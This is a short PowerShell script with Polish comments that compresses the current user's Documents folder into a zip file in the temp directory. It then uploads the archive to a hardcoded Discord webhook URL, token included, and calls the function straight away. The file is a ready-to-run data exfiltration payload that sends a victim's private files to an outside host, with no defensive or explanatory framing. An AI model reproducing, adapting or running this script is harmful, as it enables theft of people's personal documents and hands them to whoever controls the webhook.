function Upload-ZippedFilesToDiscord {
    [CmdletBinding()]
    param (
        [parameter(Position=0, Mandatory=$False)]
        [string]$folderPath,
        [parameter(Position=1, Mandatory=$False)]
        [string]$webhookUrl
    )

    # Sprawdzenie, czy podano ścieżkę do folderu
    if ([string]::IsNullOrEmpty($folderPath)){
        $folderPath = "$env:USERPROFILE\Documents"
    }

    # Sprawdzenie, czy podano webhook URL
    if ([string]::IsNullOrEmpty($webhookUrl)){
        Write-Error "Webhook URL is required."
        return
    }

    # Tworzenie nazwy pliku .zip
    $zipPath = "$env:TEMP\Documents.zip"

    # Kompresowanie plików i folderów do pliku .zip
    Compress-Archive -Path "$folderPath\*" -DestinationPath $zipPath

    # Wysyłanie pliku .zip na Discord
    Invoke-RestMethod -Uri $webhookUrl -Method Post -InFile $zipPath -Headers @{ 'Content-Type' = 'multipart/form-data' }
}

# Przykład użycia
$webhookUrl = "https://discord.com/api/webhooks/1169613960429965382/uSQurwvfaGLDPwSZosk8AdXV3Yfk0kkupkFZPUJvhjf7lS5aww0M6GWxViPns5CFUZON"
$folderPath = "$env:USERPROFILE\Documents"


Upload-ZippedFilesToDiscord -folderPath $folderPath -webhookUrl $webhookUrl